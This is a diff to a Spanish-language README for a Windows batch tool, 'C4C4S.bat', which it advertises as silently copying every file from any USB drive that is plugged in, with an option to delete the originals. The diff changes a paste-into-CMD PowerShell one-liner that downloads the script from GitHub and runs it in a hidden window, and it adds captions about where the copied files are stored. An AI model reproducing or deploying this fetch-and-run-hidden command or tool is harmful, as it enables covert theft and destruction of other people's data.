@@ -1,10 +1,10 @@
 # C4C4S.bat / C4C4S.bat
-<b>Esta es una herramienta para copiar todos los archivos de una memoria sin ser detectado.</b><br><br>
+<b>Esta es una herramienta para copiar todos los archivos de una memoria externa sin ser detectado.</b><br><br>
 Escucha cuando se conecta un dispositivo de almacenamiento, despues copia los archivos del dispositivo conectado y tienes la opción de borrar los archivos despues de ser copiados.
 
 <h2>Para copiar archivos de USB borrando los archivos de la memoria al finalizar, pega esto en una ventana del CMD</h2>
 <pre>
-powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MANUEL1518/c4c4s/master/c4c4s.bat','c4.bat'); powershell -windowstyle hidden -command cmd /c call c4.bat;
+powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MANUEL1518/c4c4s/master/c4c4s.bat','c4s.bat'); powershell -windowstyle hidden -command cmd /c call c4s.bat;
 </pre>
 
 <h2>Para copiar archivos de USB sin modificar o borrar los archivos origen, pega esto en una ventana del CMD</h2>
@@ -22,6 +22,7 @@ powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubuserconten
 <h2>Codigo fuente</h2>
 
 <h3>C4s :</h3>
+<p><b>(Copia todos los archivos de memoria a "NCopy" en Escritorio y borra los originales)</b></p>
 <pre>
 <code>
 @echo off
@@ -44,6 +45,7 @@ goto try
 </pre>
 
 <h3>C4 :</h3>
+<p><b>(Copia todos los archivos de memoria a "NCopy" en Escritorio sin editar los archivos originales)</b></p>
 <pre>
 <code>
 @echo off
